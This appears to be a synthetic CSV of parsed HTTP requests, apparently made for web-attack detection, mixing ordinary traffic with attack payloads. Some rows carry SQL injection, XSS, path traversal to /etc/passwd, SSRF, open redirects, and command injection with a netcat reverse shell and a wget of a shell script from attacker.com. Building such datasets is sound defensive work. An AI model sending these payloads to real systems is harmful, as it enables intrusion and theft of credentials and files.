source_ip,timestamp,full_url,method,host,path,query_string,fragment,status_code,user_agent,referrer,source
192.168.1.226,2026-04-07T07:48:26.950431,http://api.example.com/blog?brand=apple,GET,api.example.com,/blog,brand=apple,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.141,2026-04-07T07:48:26.951751,http://example.com/images/logo.png?filter=recent&brand=apple,POST,example.com,/images/logo.png,filter=recent&brand=apple,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.109,2026-04-07T07:48:26.951751,https://example.com/read?file=../../../etc/passwd,GET,example.com,/read,file=../../../etc/passwd,,,burpsuite,,pcap
192.168.1.21,2026-04-07T07:48:26.951751,https://example.com/login?user=1%27%20AND%201%3D1--,GET,example.com,/login,user=1%27%20AND%201%3D1--,,,dirbuster,,pcap
192.168.1.171,2026-04-07T07:48:26.952823,http://192.168.1.100/images/logo.png?sort=asc,GET,192.168.1.100,/images/logo.png,sort=asc,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.99,2026-04-07T07:48:26.952823,http://webapp.internal/contact?to=2024-12-31&q=laptop,GET,webapp.internal,/contact,to=2024-12-31&q=laptop,,,curl/8.4.0,,pcap
10.0.0.70,2026-04-07T07:48:26.953832,http://test-app.local/api/v1/status?brand=apple&limit=10,GET,test-app.local,/api/v1/status,brand=apple&limit=10,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.240,2026-04-07T07:48:26.953832,https://api.example.com/products?brand=apple&status=active,GET,api.example.com,/products,brand=apple&status=active,,,curl/8.4.0,,pcap
192.168.1.11,2026-04-07T07:48:26.953832,http://webapp.internal/privacy,GET,webapp.internal,/privacy,,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.63,2026-04-07T07:48:27.099036,http://api.example.com/settings?q=laptop&lang=en,GET,api.example.com,/settings,q=laptop&lang=en,,,python-requests/2.31.0,,pcap
10.0.0.219,2026-04-07T07:48:27.099036,http://10.0.0.50/js/main.js,GET,10.0.0.50,/js/main.js,,,,python-requests/2.31.0,,pcap
172.16.0.208,2026-04-07T07:48:27.099036,https://webapp.internal/events,HEAD,webapp.internal,/events,,,,curl/8.4.0,,pcap
172.16.0.128,2026-04-07T07:48:27.099036,http://example.com/products?user=1',POST,example.com,/products,user=1',,,masscan/1.3,,pcap
10.0.0.247,2026-04-07T07:48:27.100032,http://test-app.local/cart,GET,test-app.local,/cart,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.121,2026-04-07T07:48:27.100032,http://192.168.1.100/about,HEAD,192.168.1.100,/about,,,,python-requests/2.31.0,,pcap
10.0.0.244,2026-04-07T07:48:27.100032,http://admin.example.com/search,HEAD,admin.example.com,/search,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.186,2026-04-07T07:48:27.100032,http://webapp.internal/api/message?name=<math><maction,POST,webapp.internal,/api/message,name=<math><maction,,,python-requests/2.31.0,,pcap
192.168.1.246,2026-04-07T07:48:27.101539,https://example.com/goto?next=javascript%3Aalert%28document.domain%29,GET,example.com,/goto,next=javascript%3Aalert%28document.domain%29,,,sqlmap/1.7.12#dev,,pcap
192.168.1.73,2026-04-07T07:48:27.102607,https://webapp.internal/blog/category/tech?status=active&lang=en,POST,webapp.internal,/blog/category/tech,status=active&lang=en,,,PostmanRuntime/7.35.0,,pcap
172.16.0.29,2026-04-07T07:48:27.102607,"http://admin.example.com/search?query=""-alert(1)-""",POST,admin.example.com,/search,"query=""-alert(1)-""",,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.91,2026-04-07T07:48:27.103594,http://secure.example.com/settings,GET,secure.example.com,/settings,,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.71,2026-04-07T07:48:27.103594,https://10.0.0.50/news?format=json,GET,10.0.0.50,/news,format=json,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.144,2026-04-07T07:48:27.103594,http://api.example.com/help?format=json,HEAD,api.example.com,/help,format=json,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.202,2026-04-07T07:48:27.104571,https://shop.example.com/privacy?user=john&q=laptop&order=name,GET,shop.example.com,/privacy,user=john&q=laptop&order=name,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.99,2026-04-07T07:48:27.104571,http://api.example.com/settings,POST,api.example.com,/settings,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.194,2026-04-07T07:48:27.104571,http://10.0.0.50/admin?search=',GET,10.0.0.50,/admin,search=',,,burpsuite,,pcap
172.16.0.52,2026-04-07T07:48:27.105583,http://webapp.internal/comment?name=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,GET,webapp.internal,/comment,name=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.223,2026-04-07T07:48:27.106092,https://example.com/load?file=..%c0%af..%c0%af..%c0%afetc/passwd,GET,example.com,/load,file=..%c0%af..%c0%af..%c0%afetc/passwd,,,nikto/2.5.0,,pcap
10.0.0.108,2026-04-07T07:48:27.106092,http://secure.example.com/images/logo.png?format=json&q=laptop&limit=10,POST,secure.example.com,/images/logo.png,format=json&q=laptop&limit=10,,,curl/8.4.0,,pcap
192.168.1.243,2026-04-07T07:48:27.106092,http://admin.example.com/terms?format=json&to=2024-12-31,GET,admin.example.com,/terms,format=json&to=2024-12-31,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.124,2026-04-07T07:48:27.107098,http://webapp.internal/lookup?cmd=test%7C%20nc%20attacker.com%204444%20-e%20%2Fbin%2Fsh,GET,webapp.internal,/lookup,cmd=test%7C%20nc%20attacker.com%204444%20-e%20%2Fbin%2Fsh,,,nikto/2.5.0,,pcap
172.16.0.84,2026-04-07T07:48:27.107098,http://192.168.1.100/login?q=',POST,192.168.1.100,/login,q=',,,nuclei,,pcap
172.16.0.14,2026-04-07T07:48:27.107098,http://shop.example.com/redirect?target=%2F%2F%2Fevil.com,GET,shop.example.com,/redirect,target=%2F%2F%2Fevil.com,,,nikto/2.5.0,,pcap
10.0.0.253,2026-04-07T07:48:27.108092,http://webapp.internal/login?user=%27%29%20OR%20%28%271%27%3D%271,POST,webapp.internal,/login,user=%27%29%20OR%20%28%271%27%3D%271,,,sqlmap/1.7.12#dev,,pcap
192.168.1.152,2026-04-07T07:48:27.108092,http://10.0.0.50/?view=list&id=123,GET,10.0.0.50,/,view=list&id=123,,,PostmanRuntime/7.35.0,,pcap
172.16.0.107,2026-04-07T07:48:27.109069,http://secure.example.com/index.html,HEAD,secure.example.com,/index.html,,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.3,2026-04-07T07:48:27.109069,http://secure.example.com/about?brand=apple&status=active&to=2024-12-31,GET,secure.example.com,/about,brand=apple&status=active&to=2024-12-31,,,PostmanRuntime/7.35.0,,pcap
192.168.1.158,2026-04-07T07:48:27.110038,https://secure.example.com/events?type=product&view=list,GET,secure.example.com,/events,type=product&view=list,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.172,2026-04-07T07:48:27.110038,https://test-app.local/feedback?name=<input,POST,test-app.local,/feedback,name=<input,,,sqlmap/1.7.12#dev,,pcap
172.16.0.80,2026-04-07T07:48:27.110038,http://test-app.local/api/products,HEAD,test-app.local,/api/products,,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.242,2026-04-07T07:48:27.111014,http://10.0.0.50/notifications,POST,10.0.0.50,/notifications,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.145,2026-04-07T07:48:27.111014,http://api.example.com/out?url=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,GET,api.example.com,/out,url=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,,,python-requests/2.31.0,,pcap
10.0.0.65,2026-04-07T07:48:27.111014,https://example.com/products,HEAD,example.com,/products,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.52,2026-04-07T07:48:27.112021,http://192.168.1.100/dashboard,GET,192.168.1.100,/dashboard,,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.83,2026-04-07T07:48:27.113011,http://api.example.com/api/v2/data,POST,api.example.com,/api/v2/data,,,,curl/8.4.0,,pcap
10.0.0.30,2026-04-07T07:48:27.113011,http://webapp.internal/download/..;/..;/..;/etc/passwd,GET,webapp.internal,/download/..;/..;/..;/etc/passwd,,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.185,2026-04-07T07:48:27.113011,https://example.com/api/execute?command=test|,POST,example.com,/api/execute,command=test|,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.82,2026-04-07T07:48:27.113993,http://admin.example.com/feedback?message=<img,GET,admin.example.com,/feedback,message=<img,,,ZAP/2.14.0,,pcap
172.16.0.197,2026-04-07T07:48:27.113993,https://192.168.1.100/logout?view=list&user=john&category=electronics,GET,192.168.1.100,/logout,view=list&user=john&category=electronics,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.248,2026-04-07T07:48:27.113993,http://admin.example.com/file?template=../../../etc/passwd,GET,admin.example.com,/file,template=../../../etc/passwd,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.132,2026-04-07T07:48:27.114967,http://test-app.local/api/products?status=active,GET,test-app.local,/api/products,status=active,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.224,2026-04-07T07:48:27.114967,https://test-app.local/terms?page=1,GET,test-app.local,/terms,page=1,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.207,2026-04-07T07:48:27.114967,http://10.0.0.50/images/logo.png,GET,10.0.0.50,/images/logo.png,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.185,2026-04-07T07:48:27.115934,http://test-app.local/api/users?order=name&category=electronics&to=2024-12-31,POST,test-app.local,/api/users,order=name&category=electronics&to=2024-12-31,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.52,2026-04-07T07:48:27.115934,http://admin.example.com/api/users?user=1',POST,admin.example.com,/api/users,user=1',,,python-requests/2.31.0,,pcap
192.168.1.1,2026-04-07T07:48:27.116944,http://10.0.0.50/include?include=../../../proc/self/environ,GET,10.0.0.50,/include,include=../../../proc/self/environ,,,curl/8.4.0,,pcap
10.0.0.119,2026-04-07T07:48:27.116944,http://admin.example.com/register,GET,admin.example.com,/register,,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.149,2026-04-07T07:48:27.117934,http://admin.example.com/search,GET,admin.example.com,/search,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.144,2026-04-07T07:48:27.117934,https://admin.example.com/api/users?search=-1',GET,admin.example.com,/api/users,search=-1',,,gobuster/3.6,,pcap
172.16.0.90,2026-04-07T07:48:27.119173,http://192.168.1.100/api/fetch?uri=http%3A%2F%2F2130706433%2F,GET,192.168.1.100,/api/fetch,uri=http%3A%2F%2F2130706433%2F,,,curl/8.4.0,,pcap
10.0.0.252,2026-04-07T07:48:27.119173,http://10.0.0.50/download//var/log/apache2/access.log,GET,10.0.0.50,/download//var/log/apache2/access.log,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.68,2026-04-07T07:48:27.119173,https://test-app.local/notifications?format=json&filter=recent&id=123,GET,test-app.local,/notifications,format=json&filter=recent&id=123,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.22,2026-04-07T07:48:27.120166,https://192.168.1.100/search?user=john&format=json,GET,192.168.1.100,/search,user=john&format=json,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.125,2026-04-07T07:48:27.120166,http://192.168.1.100/api/products,GET,192.168.1.100,/api/products,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.237,2026-04-07T07:48:27.121135,http://test-app.local/search?category=electronics&filter=recent,GET,test-app.local,/search,category=electronics&filter=recent,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.48,2026-04-07T07:48:27.121135,http://shop.example.com/api/v1/health?filter=recent,GET,shop.example.com,/api/v1/health,filter=recent,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.53,2026-04-07T07:48:27.121135,https://api.example.com/api/v1/status?user=john&filter=recent&limit=10,POST,api.example.com,/api/v1/status,user=john&filter=recent&limit=10,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.232,2026-04-07T07:48:27.122149,https://10.0.0.50/image?url=http%3A%2F%2F2130706433%2F,GET,10.0.0.50,/image,url=http%3A%2F%2F2130706433%2F,,,python-requests/2.31.0,,pcap
10.0.0.104,2026-04-07T07:48:27.123135,http://test-app.local/api/v2/data?user=john&to=2024-12-31&q=laptop,GET,test-app.local,/api/v2/data,user=john&to=2024-12-31&q=laptop,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.35,2026-04-07T07:48:27.123135,http://api.example.com/dashboard?sort=asc&from=2024-01-01&q=laptop,GET,api.example.com,/dashboard,sort=asc&from=2024-01-01&q=laptop,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.200,2026-04-07T07:48:27.123642,https://secure.example.com/profile?search=%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E,POST,secure.example.com,/profile,search=%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E,,,nuclei,,pcap
192.168.1.237,2026-04-07T07:48:27.123642,http://10.0.0.50/read?template=../../../etc/passwd,GET,10.0.0.50,/read,template=../../../etc/passwd,,,sqlmap/1.7.12#dev,,pcap
192.168.1.253,2026-04-07T07:48:27.123642,http://10.0.0.50/lookup?user=%2A%29%28mail%3D%2A,GET,10.0.0.50,/lookup,user=%2A%29%28mail%3D%2A,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.73,2026-04-07T07:48:27.124637,http://test-app.local/about?status=active,GET,test-app.local,/about,status=active,,,curl/8.4.0,,pcap
10.0.0.200,2026-04-07T07:48:27.124637,http://example.com/proxy?uri=http%3A%2F%2F127.1%2F,GET,example.com,/proxy,uri=http%3A%2F%2F127.1%2F,,,ZAP/2.14.0,,pcap
172.16.0.153,2026-04-07T07:48:27.124637,http://api.example.com/exec?host=test%24%28cat%20%2Fetc%2Fpasswd%29,POST,api.example.com,/exec,host=test%24%28cat%20%2Fetc%2Fpasswd%29,,,PostmanRuntime/7.35.0,,pcap
192.168.1.229,2026-04-07T07:48:27.125614,http://webapp.internal/products?brand=apple&type=product,GET,webapp.internal,/products,brand=apple&type=product,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.119,2026-04-07T07:48:27.125614,https://secure.example.com/link?goto=%2F%2F%2Fevil.com,GET,secure.example.com,/link,goto=%2F%2F%2Fevil.com,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.130,2026-04-07T07:48:27.125614,http://test-app.local/login,GET,test-app.local,/login,,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.210,2026-04-07T07:48:27.125614,http://192.168.1.100/products?order=1',POST,192.168.1.100,/products,order=1',,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.117,2026-04-07T07:48:27.125614,http://api.example.com/check?path=http%3A%2F%2F127.0.0.1%2Fadmin,GET,api.example.com,/check,path=http%3A%2F%2F127.0.0.1%2Fadmin,,,ZAP/2.14.0,,pcap
10.0.0.236,2026-04-07T07:48:27.127122,http://test-app.local/contact,HEAD,test-app.local,/contact,,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.57,2026-04-07T07:48:27.127122,http://test-app.local/file?include=..%252f..%252f..%252fetc/passwd,GET,test-app.local,/file,include=..%252f..%252f..%252fetc/passwd,,,PostmanRuntime/7.35.0,,pcap
192.168.1.71,2026-04-07T07:48:27.127122,http://webapp.internal/blog/category/tech?lang=en,GET,webapp.internal,/blog/category/tech,lang=en,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.19,2026-04-07T07:48:27.128105,http://10.0.0.50/css/style.css?limit=10&to=2024-12-31,GET,10.0.0.50,/css/style.css,limit=10&to=2024-12-31,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.114,2026-04-07T07:48:27.128105,https://test-app.local/api/users?order=name&limit=10&sort=asc,POST,test-app.local,/api/users,order=name&limit=10&sort=asc,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.134,2026-04-07T07:48:27.129081,http://admin.example.com/profile,GET,admin.example.com,/profile,,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.201,2026-04-07T07:48:27.129081,http://example.com/products,GET,example.com,/products,,,,PostmanRuntime/7.35.0,,pcap
192.168.1.64,2026-04-07T07:48:27.130059,http://test-app.local/login?category=',POST,test-app.local,/login,category=',,,curl/8.4.0,,pcap
10.0.0.174,2026-04-07T07:48:27.130059,http://test-app.local/terms?q=laptop&brand=apple&order=name,HEAD,test-app.local,/terms,q=laptop&brand=apple&order=name,,,python-requests/2.31.0,,pcap
192.168.1.116,2026-04-07T07:48:27.131047,https://shop.example.com/lookup?command=test%26%26%20wget%20http%3A%2F%2Fattacker.com%2Fshell.sh,POST,shop.example.com,/lookup,command=test%26%26%20wget%20http%3A%2F%2Fattacker.com%2Fshell.sh,,,burpsuite,,pcap
172.16.0.134,2026-04-07T07:48:27.131047,http://secure.example.com/login?user=1%27%20ORDER%20BY%201--,GET,secure.example.com,/login,user=1%27%20ORDER%20BY%201--,,,gobuster/3.6,,pcap
10.0.0.109,2026-04-07T07:48:27.131047,https://admin.example.com/comment?q=<svg,GET,admin.example.com,/comment,q=<svg,,,masscan/1.3,,pcap
172.16.0.8,2026-04-07T07:48:27.131047,http://192.168.1.100/api/products,GET,192.168.1.100,/api/products,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.77,2026-04-07T07:48:27.131047,http://secure.example.com/download/..;/..;/..;/etc/passwd,GET,secure.example.com,/download/..;/..;/..;/etc/passwd,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.195,2026-04-07T07:48:27.132558,http://admin.example.com/api/orders?view=list&id=123,GET,admin.example.com,/api/orders,view=list&id=123,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.146,2026-04-07T07:48:27.132558,https://shop.example.com/blog?limit=10&sort=asc,POST,shop.example.com,/blog,limit=10&sort=asc,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.32,2026-04-07T07:48:27.133698,http://192.168.1.100/search?username=%2A%28%29%7C%2526%27,GET,192.168.1.100,/search,username=%2A%28%29%7C%2526%27,,,masscan/1.3,,pcap
172.16.0.203,2026-04-07T07:48:27.133698,http://admin.example.com/privacy,POST,admin.example.com,/privacy,,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.53,2026-04-07T07:48:27.133698,https://admin.example.com/image?fetch=http%3A%2F%2F127.0.0.1%2Fadmin,GET,admin.example.com,/image,fetch=http%3A%2F%2F127.0.0.1%2Fadmin,,,gobuster/3.6,,pcap
